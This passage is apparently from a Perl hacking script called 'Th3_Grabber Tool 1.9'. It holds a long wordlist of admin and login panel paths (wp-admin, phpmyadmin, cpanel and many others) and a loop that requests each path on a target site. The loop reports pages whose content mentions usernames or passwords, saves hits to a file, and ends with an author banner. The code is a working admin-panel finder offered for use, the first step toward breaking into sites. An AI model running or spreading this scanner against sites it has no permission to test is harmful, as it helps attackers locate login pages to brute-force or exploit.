hp','adm_auth.php','admin','admin.asp','admin.aspx','admin.cfm','admin.html','admin.php','admin.xhtml','admin/','wp-admin','wp-admin/','wp-login.php','wp-login/','admin/account.asp','admin/account.cfm','admin/account.html','admin/account.php','admin/admin.asp','admin/admin.cfm','admin/admin.html','admin/admin.php','admin/admin_login.asp','admin/admin_login.cfm','admin/admin_login.html','admin/admin_login.php','admin/admin-login.asp','admin/adminLogin.asp','admin/admin-login.cfm','admin/adminLogin.cfm','admin/admin-login.html','admin/adminLogin.html','admin/admin-login.php','admin/adminLogin.php','admin/controlpanel.asp','admin/controlpanel.cfm','admin/controlpanel.html','admin/controlpanel.php','admin/cp.asp','admin/cp.cfm','admin/cp.html','admin/cp.php','admin/home.asp','admin/home.cfm','admin/home.html','admin/home.php','admin/index.asp','admin/index.cfm','admin/index.html','admin/index.php','admin/login.asp','admin/login.cfm','admin/login.html','admin/login.php','account.asp','account.cfm','account.html','account.php','acct_login/','adm','adm.asp','adm.cfm','adm.html','adm.php','adm/','adm/admloginuser.asp','adm/admloginuser.cfm','adm/admloginuser.php','adm/index.asp','adm/index.cfm','adm/index.html','adm/index.php','adm_auth.asp','adm_auth.cfm','adm_auth.php','admin_area','admin_area/','admin_area/admin.asp','admin_area/admin.cfm','admin_area/admin.html','admin_area/admin.php','admin_area/index.asp','admin_area/index.cfm','admin_area/index.html','admin_area/index.php','admin_area/login.asp','admin_area/login.cfm','admin_area/login.html','admin_area/login.php','admin_login.asp','admin_login.cfm','admin_login.html','admin_login.php','admin1.asp','admin1.html','admin1.php','admin1/','admin2.asp','admin2.cfm','admin2.html','admin2.php','admin2/index.asp','admin2/index.cfm','admin2/index.php','admin2/login.asp','admin2/login.cfm','admin2/login.php','admin4_account/','admin4_colon/','adminarea','adminarea/admin.asp','adminarea/admin.cfm','adminarea/admin.html','adminarea/admin.php','adminarea/index.asp','adminarea/index.cfm','adminarea/index.html','adminarea/index.php','adminarea/login.asp','adminarea/login.cfm','adminarea/login.html','adminarea/login.php','admincontrol.asp','admincontrol.cfm','admincontrol.html','admincontrol.php','admincontrol/login.asp','admincontrol/login.cfm','admincontrol/login.html','admincontrol/login.php','admincp/index.asp','admincp/index.cfm','admincp/index.html','admincp/login.asp','admincp/login.cfm','administer/','administr8.asp','administr8.html','administr8.php','administr8/','administratie/','administration.html','administration.php','administration/','administrator','administrator.asp','administrator.cfm','administrator.html','administrator.php','administrator/','administrator/account.asp','administrator/account.cfm','administrator/account.html','administrator/account.php','administrator/index.asp','administrator/index.cfm','administrator/index.html','administrator/index.php','administrator/login.asp','administrator/login.cfm','administrator/login.html','administrator/login.php','administratoraccounts/','administratorlogin','administratorlogin.asp','administratorlogin.cfm','administratorlogin.php','administrators/','administrivia/','adminLogin','admin-login.asp','adminLogin.asp','admin-login.cfm','adminLogin.cfm','admin-login.html','adminLogin.html','admin-login.php','adminLogin.php','adminpanel.asp','adminpanel.cfm','adminpanel.html','adminpanel.php','adminpro/','admins.asp','admins.html','admins.php','admins/','AdminTools/','admloginuser.asp','admloginuser.cfm','admloginuser.php','affiliate.asp','affiliate.cfm','affiliate.php','autologin/','banneradmin/','bb-admin','bbadmin/','bb-admin/admin.asp','bb-admin/admin.cfm','bb-admin/admin.html','bb-admin/admin.php','bb-admin/index.asp','bb-admin/index.cfm','bb-admin/index.html','bb-admin/index.php','bb-admin/login.asp','bb-admin/login.cfm','bb-admin/login.html','bb-admin/login.php','bigadmin/','blogindex/','cadmins/','ccp14admin/','Clave/','cmsadmin/','controlpanel.asp','controlpanel.cfm','controlpanel.html','controlpanel.php','controlpanel/','cp.asp','cp.cfm','cp.html','cp.php','cpanel/','cPanel/','cpanel_file/','customer_login/','database_administration/','Database_Administration/','directadmin/','dir-login/','ezsqliteadmin/','fileadmin.asp','fileadmin.html','fileadmin.php','fileadmin/','formslogin/','globes_admin/','home.asp','home.cfm','home.html','home.php','
        hpwebjetadmin/','Indy_admin/','instadmin','irc-macadmin/','LiveUser_Admin/','login.asp','login.cfm','login.html','login.php','login_db/','login1/','loginflat/','login-redirect/','login-us/','logo_sysadmin/','Lotus_Domino_Admin/','macadmin/','manage','manuallogin/','memberadmin','memberadmin.asp','memberadmin.cfm','memberadmin.php','members/','memlogin/','meta_login/','modelsearch/admin.asp','modelsearch/admin.cfm','modelsearch/admin.html','modelsearch/admin.php','modelsearch/index.asp','modelsearch/index.cfm','modelsearch/index.html','modelsearch/index.php','modelsearch/login.asp','modelsearch/login.cfm','modelsearch/login.html','modelsearch/login.php','moderator','moderator.asp','moderator.cfm','moderator.html','moderator.php','moderator/','moderator/admin.asp','moderator/admin.cfm','moderator/admin.html','moderator/admin.php','moderator/login.asp','moderator/login.cfm','moderator/login.html','moderator/login.php','myadmin/','navSiteAdmin/','newsadmin/','nsw/admin/login.php','openvpnadmin/','P/W/','pages/admin/admin-login.asp','pages/admin/admin-login.cfm','pages/admin/admin-login.html','pages/admin/admin-login.php','panel/','panel-administracion','panel-administracion/admin.asp','panel-administracion/admin.cfm','panel-administracion/admin.html','panel-administracion/admin.php','panel-administracion/index.asp','panel-administracion/index.cfm','panel-administracion/index.html','panel-administracion/index.php','panel-administracion/login.asp','panel-administracion/login.cfm','panel-administracion/login.html','panel-administracion/login.php','passe/','password/','Password/','PASSWORD/','Personal/','pgadmin/','phpldapadmin/','phpmyadmin/','phppgadmin/','phpSQLiteAdmin/','platz_login/','power_user/','project-admins/','pureadmin/','radmind/','radmind-1/','rcjakar/admin/login.php','rcLogin/','senha/','Senha/','Server.asp','Server.html','Server.php','server/','Server/','server_admin_small/','ServerAdministrator/','showlogin/','simpleLogin/','Sing/','siteadmin/index.asp','siteadmin/index.cfm','siteadmin/index.php','siteadmin/login.asp','siteadmin/login.cfm','siteadmin/login.html','siteadmin/login.php','smblogin/','sql-admin/','ss_vms_admin_sm/','sshadmin/','staradmin/','sub-login/','Super-Admin/','support_login/','sysadmin.asp','sysadmin.html','sysadmin.php','sysadmin/','sys-admin/','SysAdmin/','SysAdmin2/','sysadmins/','system_administration/','system-administration/','typo3/','ur-admin.asp','ur-admin.html','ur-admin.php','ur-admin/','usager/','Usager/','user.asp','user.cfm','user.html','user.php','useradmin/','UserLogin/','username/','Username/','USERNAME/','Usuario/','utility_login/','vadmind/','vmailadmin/','webadmin','webadmin.asp','webadmin.cfm','webadmin.html','webadmin.php','webadmin/','WebAdmin/','webadmin/admin.asp','webadmin/admin.cfm','webadmin/admin.html','webadmin/admin.php','webadmin/index.asp','webadmin/index.cfm','webadmin/index.html','webadmin/index.php','webadmin/login.asp','webadmin/login.cfm','webadmin/login.html','webadmin/login.php','wizmysqladmin/','wp-admin','wp-admin/','wp-login.php','wp-login/','xlogin/','yonetici.asp','yonetici.html','yonetici.php','yonetim.asp','yonetim.html','yonetim.php','ser.asp','panel.asp','admin/login.htm','administratorlogin.php','cp.asp','admin.php','administrators.php','relogin.htm','log-in.asp','controlpanel.asp','controlpanel/','vadmind/','log-in.php','authadmin.php','xlogin/','server_admin_small/','admincp/login.php','adm_auth.asp','checkadmin.asp','adminpro/','loginflat/','bb-admin/login.asp','news_detail.php','Indy_admin/','adminitem.asp','vorod.php','moderator/login.asp','login1/','irc-macadmin/','superuser.php','pureadmin/','formslogin/','adminitems/','sysadm/','0manager/','Server/','phpldapadmin/','myadmin/','yonetim.html','adminLogin/','vorod/','sysadm.asp','administrator/','loginok/','root/','yonetim.php','loginphp','index.swf','loginsave/','admin1.htm','dir-login/','wp-login.php','superuserasp','moderator/admin.asp','adminsite/','logoutasp','access/','cpanel_file/','sysadmins/','moderator.php','relogin.php','users/','smblogin/','navSiteAdmin/','isadmin.php','sign-in.php','memlogin/','phppgadmin/','management.asp','js/jquery-1.4.2.js','7','http://www.mirandam.com/panel/about_edit.php','instadmin/','bb-admin/admin.html','0admin/','affiliate.php','meta_login/','signin.php','superuser.asp','loginsuper/','vorod.asp','aadmin/','ur-admin.php','yonetici.asp','admin/controlpanel.asp','administr8.asp','signin.asp','administration/','admin2.asp','blogindex/','ur-admin/','admincontrol.php','cgi-bin/loginasp','js/%20id=','cgi-bin/loginphp','adm.php','admin_login.asp','administration.php','login-us/','supermanagerasp','moderator/admin.php','admin/account.php','Server.asp','useradmin/','adminlogin.php','bigadmin/','moderator.asp','login_adminasp','authentication.asp','power_user/','modules/admin/','admin1.asp','platz_login/','manager/','logout/','manage/','admin/admin.asp','moderator/login.php','pages/admin/admin-login.php','fileadmin.asp','wp-admin/','logo_sysadmin/','admin/adminLogin.htm','bb-admin/admin.asp','pages/admin/','processlogin.php','loginsuperphp','super1php','uvpanel/','macadmin/','system_administration/','admin/cp.php','admin4_account/','sysadmin.php','control.php','supermanphp','super_indexasp','admin/adminLogin.php','panel-administracion/login.php','admin/account.html','admins.php','log_in.php','admins.asp','radmind-1/','sysadm.php','staradmin/','login_db/','userlogin.php','secrets/','accounts.php','security/','login/','manage.php','panel/js/jquery.maskedinput.js','login_userasp','vmailadmin/','globes_admin/','fileadmin/','login_outphp','admin4_colon/','superphp','admin/','vorud.asp','admin_login.php','manager.php','admin/account.asp','admin_area.asp','admin.html','usr/','administr8.php','SysAdmin2/','adminitem.php','login.php','management/','project-admins/','typo3/','admin.htm','admin/home.asp','vorud.php','admins/','accounts/','super_loginphp','super_indexphp','adminpanel.php','memberadmin/','access.asp','superuserphp','system-administration/','pages/admin/admin-login.asp','panel-administracion/login.asp','sign_in.php','super_loginasp','moderator.html','log_in/','autologin.php','ysadmin.asp','supermanasp','adminitems.php','admin/cp.asp','acceso.php','login-redirect/','auth.php','login.asp','Database_Administration/','webadmin.asp','modelsearch/login.asp','cmsadmin/','admincp/login.asp','phpSQLiteAdmin/','login_admin/','ServerAdministrator/','admin-login.asp','letmein.asp','member/','acct_login/','loginsuperasp','manage.asp','sign_in/','LiveUser_Admin/','administratoraccounts/','utility_login/','administrator.php','js/url.slice(0,off)','secure/','administrator/login.asp','checklogin.asp','admin_area/login.php','authentication.php','UserLogin/','webadmin/','rcLogin/','sub-login/','authenticate.asp','login.html','admin/admin-login.php','ss_vms_admin_sm/','SysAdmin/','secret/','login1php','fileadmin.php','controlpanel.php','members.asp','login1asp','irectadmin/','adminlogin.asp','affiliate.asp','admin/home.php','admin.asp','superuser/','Server.php','cpanel/','cp.php','customer_login/','access.php','administratie/','control.asp','autologin/','wp-login/','administrator/login.php','admin/admin-login.asp','openvpnadmin/','FCKeditor/editor/images/anchor.gif','checklogin.php','admin1.html','siteadmin.php','yonetim.asp','supervise/Loginasp','adminitem/','admin/controlpanel.php','authuser.php','modelsearch/login.php','ur-admin.asp','showlogin/','webmaster.php','letmein.php','admin-login.php','sign_in.asp','sshadmin/','loginasp','checkadmin.php','letmein/','panel.php','simpleLogin/','control/','log-in/','moderator/','admin/login.asp','members/','admin_area.php','logoutphp','administrator/account.php','bb-admin/','administr8/','relogin.asp','cmsadmin.asp','member.php','admin/adminLogin.html','adminpanel/','supermanagerphp','panel-administracion/','relogin.html','sign-in.asp','adm_auth.php','ezsqliteadmin/','adm.asp','member.asp','admin1.php','radmind/','login_outasp','admin2.php','admin_area/','sql-admin/','administratorlogin/','admin/login.php','admin/controlpanel.htm','processlogin.asp','administrators.asp','admincp/','Super-Admin/','kpanel/','log_in.asp','webadmin.php','accounts.asp','checkuser.php','ccp14admin/','newsadmin/','check.asp','manuallogin/','phpmyadmin/','administrators/','autologin.asp','checkuser.asp','acceso.asp','adminitems.asp','auth.asp','superasp','login_userphp','PSUser/','siteadmin.asp','admin_area/login.asp','wizmysqladmin/','memberadmin.php','userlogin.asp','siteadmin/','adminarea/','adm/','users.php','supervise/Loginphp','manager.asp','users.asp','login.htm','cmsadmin.php','administration.asp','signin/','admin_area/admin.php','admincontrol.asp','supervise/','adminpanel.asp','super1asp','login_adminphp','webmaster/','sign-in/','bbadmin/','authadmin.asp','admin/adminLogin.asp','hpwebjetadmin/','super1/','support_login/','login_out/','yonetici.html','administratorlogin.asp','bb-admin/login.php','management.php','administer/','yonetici.php','sys-admin/','Lotus_Domino_Admin/','members.php','administrivia/','authenticate.php','banneradmin/','user/','AdminTools/','admin/controlpanel.html','webmaster.asp','administrator.asp','authuser.asp','cadmins/','superman/','admincontrol/','bb-admin/admin.php','supervisor/','pgadmin/','loginerror/','admin/admin_login.php','isadmin.asp','check.php','admin/admin_login.asp','admin_area/admin.aspuser.php','admin/admin.php','admin/login.html','admin2.html','admin1/','vorud/','memberadmin.asp','administrator/account.asp'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }
}

sub aboutc(){
system('cls');

$logo="
 _______ _     ____   _____           _     _               
|__   __| |   |___ \ / ____|         | |   | |              
   | |  | |__   __) | |  __ _ __ __ _| |__ | |__   ___ _ __ 
   | |  | '_ \ |__ <| | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|
   | |  | | | |___) | |__| | | | (_| | |_) | |_) |  __/ |   
   |_|  |_| |_|____/ \_____|_|  \__,_|_.__/|_.__/ \___|_|  
   
";

print color 'bold green';
print $logo;

print "Coder : Kadd3chy\n";
print "Mail : moat3z.kadd3chy[AT]gmail[.com] \n";
print "Facebook ID : https://www.facebook.com/Kadd3chy.phtml \n";
print "ICQ : 729325418\n";
print "Th3_Grabber Tool 1.9\n";
print "Good Luck\n";
system("pause");
}